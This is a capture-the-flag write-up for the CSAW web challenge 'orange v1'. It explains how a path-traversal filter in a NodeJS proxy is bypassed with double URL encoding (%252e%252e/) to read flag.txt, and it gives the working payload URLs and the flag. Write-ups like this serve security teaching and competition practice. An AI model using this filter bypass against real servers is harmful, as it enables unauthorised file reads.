## orange v1
Web - 100 point

### Challenge 
> I wrote a little proxy program in NodeJS for my poems folder.
> Everyone wants to read flag.txt but I like it too much to share.

> http://web.chal.csaw.io:7311/?path=orange.txt

### Solution
This is a simple path traversal. Visit http://web.chal.csaw.io:7311/?path= and we see the directory.

However, there is a check for dots `..`
Visit http://web.chal.csaw.io:7311/?path=../ and we see `WHOA THATS BANNED!!!!`

-

We need to bypass the checking of dots as per [this stackexchange thread](https://security.stackexchange.com/questions/96736/path-traversal-filter-bypass-techniques)

	Try double URL encoding (. = %252e, / = %252f, \ = %255c).

Now, let's try http://web.chal.csaw.io:7311/?path=%252e%252e/
Immediately we see flag.txt in the directory!

-

The flag is found at http://web.chal.csaw.io:7311/?path=%252e%252e/flag.txt
***Flag: `flag{thank_you_based_orange_for_this_ctf_challenge}`***